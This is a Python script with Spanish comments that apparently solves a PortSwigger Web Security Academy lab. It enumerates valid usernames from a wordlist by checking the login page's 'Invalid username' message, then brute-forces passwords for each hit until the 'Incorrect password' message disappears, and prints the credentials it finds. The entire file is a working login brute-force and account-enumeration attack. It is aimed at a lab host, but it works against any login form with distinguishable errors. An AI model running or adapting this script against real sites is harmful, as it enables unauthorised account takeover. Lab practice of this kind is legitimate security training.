import requests

# Función para leer las líneas de un archivo
def leer_archivo(ruta):
    with open(ruta, 'r', encoding='utf-8') as archivo:
        return [linea.strip() for linea in archivo if linea.strip()]

# Configuración inicial
url = "https://0abc005a0435d6888193258300040081.web-security-academy.net/login"  # Reemplaza con la URL del formulario de login
usuarios_file = "usuarios_noborrar.txt"   # Archivo con la lista de usuarios
passwords_file = "passwords_db.txt"  # Archivo con la lista de contraseñas

# Leer los archivos de usuarios y contraseñas
usuarios = leer_archivo(usuarios_file)
contraseñas = leer_archivo(passwords_file)

# Encabezados HTTP (pueden variar según el sitio)
headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "text/html; charset=utf-8"
}

# Realizar las solicitudes POST
for usuario in usuarios:
        # Establecer el usuario y la contraseña falsos para encontrar un usuario valido
        password_void = "contraseña"
        data = {
            "username": usuario,
            "password": password_void
        }

        print(f"Probando: Usuario={usuario}, Contraseña={password_void}")

        try:
            # Enviar la solicitud POST
            response = requests.post(url, headers=headers, data=data)

            # si se encuentra un usuario valido, probar todas las contraseñas 
            if response.status_code == 200 and not "<p class=is-warning>Invalid username</p>" in response.text:
                print(f"¡Usuario encontrado! Usuario: {usuario}, evaluando Contraseñas...")
                
                for contraseña in contraseñas:
                    data = {
                        "username": usuario,
                        "password": contraseña
                    }
                    response = requests.post(url, headers=headers, data=data)

                    print(f"probando {contraseña}")

                    if response.status_code == 200 and not "<p class=is-warning>Incorrect password</p>" in response.text:

                        print(f"credenciales encontradas: usuario= {usuario}, contraseña={contraseña}")
                        exit(0)  
            else: # en caso de errores de conexion mostrar por consola el error correspondiente
                print("Respuesta inesperada del servidor.")
                print(f"Código de estado: {response.status_code}")
                print(f"Contenido de la respuesta: {response.text[:500]}")  # Mostrar los primeros 500 caracteres
        except requests.exceptions.RequestException as e:
            print(f"Error de conexión: {e}")
            break

print("No se encontraron credenciales válidas.")